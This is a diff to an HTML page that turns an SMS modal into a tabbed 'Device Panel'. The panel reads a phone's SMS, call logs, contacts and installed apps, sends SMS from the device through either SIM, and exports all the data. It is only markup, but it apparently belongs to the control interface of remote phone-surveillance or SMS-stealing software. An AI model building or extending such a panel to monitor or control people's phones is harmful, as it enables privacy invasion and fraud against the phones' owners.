@@ -413,62 +413,120 @@
     </div>
   </div>
 
-  <!-- ============ SMS MODAL ============ -->
-  <div class="modal-backdrop hidden" id="smsModal">
-    <div class="modal-dialog sms-modal-dialog">
-      <div class="modal-top sms-modal-top">
-        <div class="sms-modal-header">
-          <i class="ri-message-2-line"></i>
+  <!-- ============ DEVICE MODAL (Tabbed — SMS, Calls, Contacts, Apps) ============ -->
+  <div class="modal-backdrop hidden" id="deviceModal">
+    <div class="modal-dialog device-modal-dialog">
+      <div class="modal-top device-modal-top">
+        <div class="device-modal-header">
+          <i class="ri-smartphone-line"></i>
           <div>
-            <h3 id="smsModalTitle">SMS Messages</h3>
-            <span class="sms-modal-sub" id="smsModalSub">Loading...</span>
+            <h3 id="deviceModalTitle">Device Panel</h3>
+            <span class="device-modal-sub" id="deviceModalSub">Loading...</span>
           </div>
         </div>
-        <button class="btn-icon" onclick="closeSmsModal()"><i class="ri-close-line"></i></button>
-      </div>
-      <div class="sms-search-wrap">
-        <i class="ri-search-line"></i>
-        <input type="text" id="smsSearch" placeholder="Search messages..." oninput="filterSmsMessages()">
-      </div>
-
-      <!-- SMS Compose Section -->
-      <div class="sms-compose">
-        <div class="sms-compose-header">
-          <i class="ri-send-plane-2-fill"></i>
-          <span>SEND SMS FROM DEVICE</span>
-        </div>
-        <div class="sms-compose-body">
-          <div class="sms-compose-fields">
-            <div class="sms-field">
-              <label><i class="ri-phone-line"></i> Receiver</label>
-              <input type="text" id="smsReceiver" placeholder="e.g. 9876543210 or +919876543210" autocomplete="off">
-            </div>
-            <div class="sms-field sms-field-msg">
-              <label><i class="ri-message-3-line"></i> Message</label>
-              <textarea id="smsMessage" rows="2" placeholder="Type message..."></textarea>
-            </div>
-          </div>
-          <div class="sms-compose-actions">
-            <button class="sms-sim-btn sim1" onclick="sendSmsFromDevice(1)" id="smsSim1Btn">
-              <i class="ri-sim-card-2-line"></i>
-              <span>SIM 1</span>
-            </button>
-            <button class="sms-sim-btn sim2" onclick="sendSmsFromDevice(2)" id="smsSim2Btn">
-              <i class="ri-sim-card-2-line"></i>
-              <span>SIM 2</span>
-            </button>
-          </div>
-          <div class="sms-send-status hidden" id="smsSendStatus"></div>
+        <div class="device-modal-actions">
+          <button class="btn btn-sm btn-outline" onclick="exportDeviceData()" title="Export all data">
+            <i class="ri-download-2-line"></i> <span class="hide-tiny">Export</span>
+          </button>
+          <button class="btn-icon" onclick="closeDeviceModal()"><i class="ri-close-line"></i></button>
         </div>
       </div>
 
-      <div class="sms-list-container" id="smsListContainer">
-        <div class="sms-loading">
-          <i class="ri-loader-4-line ri-spin"></i>
-          <span>Loading messages...</span>
+      <!-- Tabs -->
+      <div class="device-tabs">
+        <button class="device-tab active" data-tab="sms" onclick="switchDeviceTab('sms')">
+          <i class="ri-message-2-line"></i><span>SMS</span>
+        </button>
+        <button class="device-tab" data-tab="calls" onclick="switchDeviceTab('calls')">
+          <i class="ri-phone-line"></i><span>Calls</span>
+        </button>
+        <button class="device-tab" data-tab="contacts" onclick="switchDeviceTab('contacts')">
+          <i class="ri-contacts-book-line"></i><span>Contacts</span>
+        </button>
+        <button class="device-tab" data-tab="apps" onclick="switchDeviceTab('apps')">
+          <i class="ri-apps-line"></i><span>Apps</span>
+        </button>
+      </div>
+
+      <!-- ===== TAB: SMS ===== -->
+      <div class="device-tab-content active" id="tab-sms">
+        <div class="tab-search-wrap">
+          <i class="ri-search-line"></i>
+          <input type="text" id="smsSearch" placeholder="Search messages..." oninput="filterSmsMessages()">
+        </div>
+        <!-- SMS Compose Section -->
+        <div class="sms-compose">
+          <div class="sms-compose-header">
+            <i class="ri-send-plane-2-fill"></i>
+            <span>SEND SMS FROM DEVICE</span>
+          </div>
+          <div class="sms-compose-body">
+            <div class="sms-compose-fields">
+              <div class="sms-field">
+                <label><i class="ri-phone-line"></i> Receiver</label>
+                <input type="text" id="smsReceiver" placeholder="e.g. 9876543210 or +919876543210" autocomplete="off">
+              </div>
+              <div class="sms-field sms-field-msg">
+                <label><i class="ri-message-3-line"></i> Message</label>
+                <textarea id="smsMessage" rows="2" placeholder="Type message..."></textarea>
+              </div>
+            </div>
+            <div class="sms-compose-actions">
+              <button class="sms-sim-btn sim1" onclick="sendSmsFromDevice(1)" id="smsSim1Btn">
+                <i class="ri-sim-card-2-line"></i><span>SIM 1</span>
+              </button>
+              <button class="sms-sim-btn sim2" onclick="sendSmsFromDevice(2)" id="smsSim2Btn">
+                <i class="ri-sim-card-2-line"></i><span>SIM 2</span>
+              </button>
+            </div>
+            <div class="sms-send-status hidden" id="smsSendStatus"></div>
+          </div>
+        </div>
+        <div class="tab-list-container" id="smsListContainer">
+          <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading messages...</span></div>
+        </div>
+        <div class="tab-pagination" id="smsPagination"></div>
+      </div>
+
+      <!-- ===== TAB: CALLS ===== -->
+      <div class="device-tab-content" id="tab-calls">
+        <div class="tab-search-wrap">
+          <i class="ri-search-line"></i>
+          <input type="text" id="callSearch" placeholder="Search calls..." oninput="filterCallLogs()">
+        </div>
+        <div class="tab-list-container" id="callsListContainer">
+          <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading call logs...</span></div>
+        </div>
+        <div class="tab-pagination" id="callsPagination"></div>
+      </div>
+
+      <!-- ===== TAB: CONTACTS ===== -->
+      <div class="device-tab-content" id="tab-contacts">
+        <div class="tab-search-wrap">
+          <i class="ri-search-line"></i>
+          <input type="text" id="contactSearch" placeholder="Search contacts..." oninput="filterContacts()">
+        </div>
+        <div class="tab-list-container" id="contactsListContainer">
+          <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading contacts...</span></div>
+        </div>
+        <div class="tab-pagination" id="contactsPagination"></div>
+      </div>
+
+      <!-- ===== TAB: APPS ===== -->
+      <div class="device-tab-content" id="tab-apps">
+        <div class="tab-search-wrap">
+          <i class="ri-search-line"></i>
+          <input type="text" id="appSearch" placeholder="Search apps..." oninput="filterApps()">
+          <label class="tab-toggle">
+            <input type="checkbox" id="showSystemApps" onchange="loadApps()">
+            <span>System</span>
+          </label>
+        </div>
+        <div class="tab-list-container" id="appsListContainer">
+          <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading apps...</span></div>
         </div>
       </div>
-      <div class="sms-pagination" id="smsPagination"></div>
+
     </div>
   </div>
 
